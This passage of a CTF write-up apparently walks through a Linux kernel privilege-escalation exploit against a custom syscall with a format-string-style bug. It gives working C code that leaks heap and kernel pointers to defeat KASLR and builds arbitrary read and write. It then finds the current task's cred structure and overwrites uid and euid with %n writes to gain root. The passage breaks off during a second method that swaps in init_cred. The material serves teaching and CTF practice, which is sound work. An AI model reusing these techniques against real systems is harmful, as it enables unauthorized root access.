      <span class="n">written_chars</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="n">kernel_write</span><span class="p">(</span><span class="n">fdget_pos</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="n">file</span><span class="p">,</span> <span class="n">new_string</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">new_string</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// output result</span>
  <span class="n">kfree</span><span class="p">(</span><span class="n">new_string</span><span class="p">);</span> <span class="c1">// free buffer</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Reading the code reveals that we can: -</p>
<ul>
  <li>print a value as pointer.</li>
  <li>print a string.</li>
  <li>write (restricted) int, short and char values.</li>
  <li>use the direct access method to set <code class="language-plaintext highlighter-rouge">current_arg</code>. (indexes are 0-based)</li>
  <li>use the width feature to increase <code class="language-plaintext highlighter-rouge">written_chars</code> to whatever value we want.<br /></li>
</ul>

<p>But, there are no checks. The pointers are not checked if they are userspace pointers or kernelspace. (userspace addresses have their first byte set to null). So, we have arbitrary read and write primitives here. Just like a format string vuln.<br />
Also, there is no null termination of the string to be printed.<br />
The resultant string is written to <code class="language-plaintext highlighter-rouge">stdin</code>.</p>

<h1 id="pre-exploitation">Pre-Exploitation</h1>
<h2 id="setup">Setup</h2>
<p>First of all, we need to get output of the syscall. We cannot read it via read, fread, scanf etc. I used fifo pipes for this. I replaced the stdin of my exploit to a fifo. This way the output is written to the fifo file and I can read it using simple file operations.<br />
But, this approach has its own peculiarities. We need to read all the remaining contents of the fifo file before reading any new input, otherwise the outputs get mixed. For this I used <code class="language-plaintext highlighter-rouge">clear_stdin</code> function to clear the stdin.<br />
Also, fifos are unseekable. So, we cannot change the offset pointer to read any offset.<br />
I created a helper function <code class="language-plaintext highlighter-rouge">read_ptr_stdin</code> to read a QWORD from the fifo file.<br />
My setup is below: -</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/syscall.h&gt;
</span>
<span class="cp">#define SYSCALL_NO 548
</span>
<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">mkfifo</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>
    <span class="n">freopen</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="s">"r+"</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/home/user/stdin_fifo"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">bytes_left</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span>
    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">FIONREAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">nbytes</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">clear_stdin</span><span class="p">(){</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">read_ptr_stdin</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">n</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">bytes_left</span><span class="p">();</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="getting-a-leak">Getting a leak</h2>
<p>Having arbitrary read and write primitives is useless without a kernel leak.<br />
For the leak, I will abuse the fact that there is no null termination.<br />
Since the string is allocated on kernel, there is a high chance that there are string adjacent to out string. In kernel heap, (as far as I know) heap allocations of same size are adjacent to each other (like jemalloc). Upon trial-and-error, I found that giving a 8-byte length string, leaks a heap pointer which is adjacent to out string.<br />
I added <code class="language-plaintext highlighter-rouge">xxd</code> to <code class="language-plaintext highlighter-rouge">initramfs</code> to check the raw bytes.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ $ ./exploit 12345678 | xxd
00000000: 3132 3334 3536 3738 50b5 0204 8088 ffff  12345678P.......
00000010: 3a61 2d30 3030 3030 3634 0a              :a-0000064.
</code></pre></div></div>
<p>It turns out that this pointer points to some strings and some pointers. But, after that there is a kernel address.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  telescope 0xffff88800402b550  70
0xffff88800402b550│+0x0000: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
0xffff88800402b558│+0x0008: 0xffff88800402b570  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873                                                                      
0xffff88800402b560│+0x0010: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
0xffff88800402b568│+0x0018: 0xffff88800402b5a0  →  0x6f6c2f6572616873  →  0x6f6c2f6572616873                                                                      
0xffff88800402b570│+0x0020: 0x6f6c2f6572616873  →  0x6f6c2f6572616873
[truncated]
0xffff88800402b760│+0x0210: 0xffffffff82074ec0  →  0x0000000000000000  →  0x0000000000000000                                                                      
[truncated]
</code></pre></div></div>
<p>Thanks to the symbols, it turns out to be the address of <code class="language-plaintext highlighter-rouge">tty_dev_attr_group</code>.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># readelf -Ws ./vmlinux_elf| grep ffffffff82074ec0
 30380: ffffffff82074ec0     0 OBJECT  LOCAL  DEFAULT    2 tty_dev_attr_group
</code></pre></div></div>
<p>Its offset from kernel base (startup_64) is <code class="language-plaintext highlighter-rouge">0xffffffff82074ec0 - 0xffffffff81000000 = 0x1074ec0</code>.<br />
But the offset between the leaked pointer and between <code class="language-plaintext highlighter-rouge">tty_dev_attr_group</code> address is not constant. So, we have to leak a couple of values and check each value. I created <code class="language-plaintext highlighter-rouge">get_leak</code> function for this.<br />
I implemented the arbitrary read in <code class="language-plaintext highlighter-rouge">arb_read</code> and made a wrapper <code class="language-plaintext highlighter-rouge">arb_read_ptr</code> around it because sometimes the values had null bytes in them.<br /></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">uint64_t</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="n">clear_stdin</span><span class="p">();</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">ptr</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">arb_read_ptr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">ptr</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="kt">uint64_t</span> <span class="n">ret</span><span class="p">;</span>
    
    <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ret</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">){</span>
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
            <span class="n">arb_read</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
            <span class="n">tmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint64_t</span> <span class="nf">get_leak</span><span class="p">(){</span>
    <span class="kt">uint64_t</span> <span class="n">leak</span><span class="p">,</span> <span class="n">ptr</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x150</span><span class="p">;</span> <span class="c1">// because the tty_dev_attr_group is always after this offset</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"12345678"</span><span class="p">};</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>

    <span class="n">read_ptr_stdin</span><span class="p">();</span> <span class="c1">// discard "12345678"</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">read_ptr_stdin</span><span class="p">();</span> <span class="c1">// heap leak</span>
    <span class="n">clear_stdin</span><span class="p">();</span>

    <span class="k">while</span><span class="p">((</span><span class="n">leak</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0x4ec0</span><span class="p">){</span>
        <span class="n">leak</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>

        <span class="n">offset</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">leak</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<h1 id="exploitation">Exploitation</h1>
<p>In kernel pwn, our objective is to escalate our privileges to root. It is usually done in two ways.</p>
<ul>
  <li>Overwriting the uids (uid, gid, euid, egid etc) in <code class="language-plaintext highlighter-rouge">cred</code> of <code class="language-plaintext highlighter-rouge">task_struct</code> of the current process.</li>
  <li>Executing <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_creds(0))</code>.</li>
</ul>

<h2 id="what-is-task_struct-and-cred">What is task_struct and cred?</h2>
<p>In linux, every process has a task_struct associated with it. It contains all information about the process (pid, file name, etc). It has a member called <code class="language-plaintext highlighter-rouge">cred</code> of type <code class="language-plaintext highlighter-rouge">struct cred</code>. It contains information about the privileges of the process (uid, gid, euid etc).</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">task_struct</span> <span class="p">{</span>
<span class="p">[</span><span class="n">truncated</span><span class="p">]</span>

	<span class="cm">/* Process credentials: */</span>

	<span class="cm">/* Tracer's credentials at attach: */</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">ptracer_cred</span><span class="p">;</span>

	<span class="cm">/* Objective and real subjective task credentials (COW): */</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">real_cred</span><span class="p">;</span>

	<span class="cm">/* Effective (overridable) subjective task credentials (COW): */</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">cred</span> <span class="n">__rcu</span>		<span class="o">*</span><span class="n">cred</span><span class="p">;</span>

<span class="cp">#ifdef CONFIG_KEYS
</span>	<span class="cm">/* Cached requested key. */</span>
	<span class="k">struct</span> <span class="n">key</span>			<span class="o">*</span><span class="n">cached_requested_key</span><span class="p">;</span>
<span class="cp">#endif
</span>
	<span class="cm">/*
	 * executable name, excluding path.
	 *
	 * - normally initialized setup_new_exec()
	 * - access it with [gs]et_task_comm()
	 * - lock it with task_lock()
	 */</span>
	<span class="kt">char</span>				<span class="n">comm</span><span class="p">[</span><span class="n">TASK_COMM_LEN</span><span class="p">];</span>

<span class="p">[</span><span class="n">truncated</span><span class="p">]</span>

<span class="k">struct</span> <span class="n">cred</span> <span class="p">{</span>
<span class="p">[</span><span class="n">truncated</span><span class="p">]</span>
	<span class="n">kuid_t</span>		<span class="n">uid</span><span class="p">;</span>		<span class="cm">/* real UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">gid</span><span class="p">;</span>		<span class="cm">/* real GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">suid</span><span class="p">;</span>		<span class="cm">/* saved UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">sgid</span><span class="p">;</span>		<span class="cm">/* saved GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">euid</span><span class="p">;</span>		<span class="cm">/* effective UID of the task */</span>
	<span class="n">kgid_t</span>		<span class="n">egid</span><span class="p">;</span>		<span class="cm">/* effective GID of the task */</span>
	<span class="n">kuid_t</span>		<span class="n">fsuid</span><span class="p">;</span>		<span class="cm">/* UID for VFS ops */</span>
	<span class="n">kgid_t</span>		<span class="n">fsgid</span><span class="p">;</span>		<span class="cm">/* GID for VFS ops */</span>
<span class="p">[</span><span class="n">truncated</span><span class="p">]</span>
</code></pre></div></div>
<p>You can have a look at their full structure. <a href="https://elixir.bootlin.com/linux/v5.13.12/source/include/linux/sched.h#L657">task_struct</a> <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/cred.h#L110">cred</a>
task_struct is stored at a fixed offset (<code class="language-plaintext highlighter-rouge">current_task</code>) from <code class="language-plaintext highlighter-rouge">__per_cpu_offset</code>. The <code class="language-plaintext highlighter-rouge">__per_cpu_offset</code> is an array of pointers to addresses which is fixed for a cpu but is subjected to kaslr (meaning it has a fixed offset from kernel base).</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># readelf -Ws ./vmlinux_elf| grep -E '__per_cpu_offset| current_task'
 92101: 0000000000016d00     0 OBJECT  GLOBAL DEFAULT  ABS current_task
118643: ffffffff824176a0     0 OBJECT  GLOBAL DEFAULT    2 __per_cpu_offset                     
</code></pre></div></div>
<p>So, the address of task_struct of current process is <code class="language-plaintext highlighter-rouge">*(*__per_cpu_offset[0]+0x16d00)</code>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x14176a0</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">task_struct</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mh">0x16d00</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"task_struct: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>You can have a look at <a href="https://github.com/slavaim/linux-notes/blob/master/current_task.md">this</a> for clearing things.
Let’s get to actual exploitation now.</p>

<h2 id="overwriting-uids-in-task_struct-cred">Overwriting uids in task_struct-&gt;cred</h2>
<p>As I explained earlier, <code class="language-plaintext highlighter-rouge">task_struct-&gt;cred</code> stores uid, gid, euid etc of the process. For escalating, we can overwrite these to make the kernel think that a process was started by <code class="language-plaintext highlighter-rouge">root</code>.<br />
For this we need to get the offset of <code class="language-plaintext highlighter-rouge">cred</code> in <code class="language-plaintext highlighter-rouge">task_struct</code>. Usually, it is done by <a href="https://pr0cf5.github.io/ctf/2019/10/10/balsn-ctf-krazynote.html">making a kernel module</a>. But, I wanted to have some other solution. I looked at the source code of <code class="language-plaintext highlighter-rouge">prepare_creds</code> function and it accessed the <code class="language-plaintext highlighter-rouge">cred</code> member from current <code class="language-plaintext highlighter-rouge">task_struct</code>. When I decompiled the function I saw the offset used.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  disas prepare_creds 
Dump of assembler code for function prepare_creds:
   0xffffffff8108d1e0 &lt;+0&gt;:     push   r12
   0xffffffff8108d1e2 &lt;+2&gt;:     mov    rdi,QWORD PTR [rip+0x1e06fe7] # 0xffffffff82e941d0
   0xffffffff8108d1e9 &lt;+9&gt;:     mov    esi,0xcc0
   0xffffffff8108d1ee &lt;+14&gt;:    push   rbp
   0xffffffff8108d1ef &lt;+15&gt;:    mov    rbp,QWORD PTR gs:0x16d00  &lt;-- current_task offset
   0xffffffff8108d1f8 &lt;+24&gt;:    call   0xffffffff811de460 &lt;kmem_cache_alloc&gt;
   0xffffffff8108d1fd &lt;+29&gt;:    test   rax,rax
   0xffffffff8108d200 &lt;+32&gt;:    je     0xffffffff8108d341 &lt;prepare_creds+353&gt;
   0xffffffff8108d206 &lt;+38&gt;:    mov    rbp,QWORD PTR [rbp+0x6b8]     &lt;-- cred offset
   0xffffffff8108d20d &lt;+45&gt;:    mov    rdi,rax
   0xffffffff8108d210 &lt;+48&gt;:    mov    ecx,0x16
   0xffffffff8108d215 &lt;+53&gt;:    mov    r12,rax
   0xffffffff8108d218 &lt;+56&gt;:    mov    rsi,rbp
   0xffffffff8108d21b &lt;+59&gt;:    rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
   0xffffffff8108d21e &lt;+62&gt;:    mov    DWORD PTR [rax],0x1
   0xffffffff8108d224 &lt;+68&gt;:    mov    DWORD PTR [rax+0xa0],0x0
   0xffffffff8108d22e &lt;+78&gt;:    mov    rax,QWORD PTR [rax+0x98]
   0xffffffff8108d235 &lt;+85&gt;:    lock inc DWORD PTR [rax]
   0xffffffff8108d238 &lt;+88&gt;:    mov    eax,0x1
[truncated]
</code></pre></div></div>
<p>So, we got <code class="language-plaintext highlighter-rouge">0x6b8</code> as offset. Let’s add this to our exploit.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x14176a0</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">task_struct</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mh">0x16d00</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred_addr</span> <span class="o">=</span> <span class="n">task_struct</span> <span class="o">+</span> <span class="mh">0x6b8</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">current_cred_addr</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"task_struct: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"current cred: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_cred</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Now we just need to write <code class="language-plaintext highlighter-rouge">0</code> to the uids. Initially I overwrote all six with zero. Upon trial-and-error, I found out that overwriting only <code class="language-plaintext highlighter-rouge">uid</code> and <code class="language-plaintext highlighter-rouge">euid</code> is enough. I changed the uid in <code class="language-plaintext highlighter-rouge">init</code> back to <code class="language-plaintext highlighter-rouge">1000</code> to see it in gdb. I found out that the uids start after an int.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x14176a0</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="p">);</span>

    <span class="kt">uint64_t</span> <span class="n">task_struct</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mh">0x16d00</span><span class="p">);</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred_addr</span> <span class="o">=</span> <span class="n">task_struct</span> <span class="o">+</span> <span class="mh">0x6b8</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">current_cred</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">current_cred_addr</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"kernel base: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kbase</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"task_struct: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"current cred: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">current_cred</span><span class="p">);</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"%n%n"</span><span class="p">,</span> 
        <span class="n">current_cred</span> <span class="o">+</span> <span class="mi">1</span><span class="o">*</span><span class="mi">4</span><span class="p">,</span> <span class="c1">// uid</span>
        <span class="n">current_cred</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">4</span>  <span class="c1">// euid</span>
    <span class="p">};</span>

    <span class="n">syscall</span><span class="p">(</span><span class="n">SYSCALL_NO</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"id; cat /root/flag.txt"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Unfortunately, we cannot get a shell because our stdin is set to the fifo. I just called <code class="language-plaintext highlighter-rouge">id</code> to check if the overwrite worked and read the flag.</p>

<h2 id="overwrite-task_struct-cred-to-init_cred">Overwrite task_struct-&gt;cred to init_cred</h2>
<p>If you don’t want to overwrite the uids or due to some reason you can only write 8 bytes, you can overwrite current <code class="language-plaintext highlighter-rouge">task_struct-&gt;cred</code> with <code class="language-plaintext highlighter-rouge">init_cred</code>. <code class="language-plaintext highlighter-rouge">init_cred</code> is a default <code class="language-plaintext highlighter-rouge">cred</code> which is used for <code class="language-plaintext highlighter-rouge">init_task</code>. You can get the address from <code class="language-plaintext highlighter-rouge">vmlinux_elf</code> and calculate the offset.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># readelf -Ws ./vmlinux_elf| grep init_cred
118934: ffffffff8264e400     0 OBJECT  GLOBAL DEFAULT   12 init_cred
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">0xffffffff8264e400 - 0xffffffff81000000 = 0x164e400</code></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
    <span class="kt">uint64_t</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">get_leak</span><span class="p">();</span>

    <span class="kt">uint64_t</span> <span class="n">kbase</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">-</span> <span class="mh">0x1074ec0</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">per_cpu_offset</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x14176a0</span><span class="p">;</span>

    <span class="n">ptr</span> <span class="o">=</span> <span class="n">arb_read_ptr</span><span class="p">(</span><span class="n">per_cpu_offset</span><span class="p">);</span>

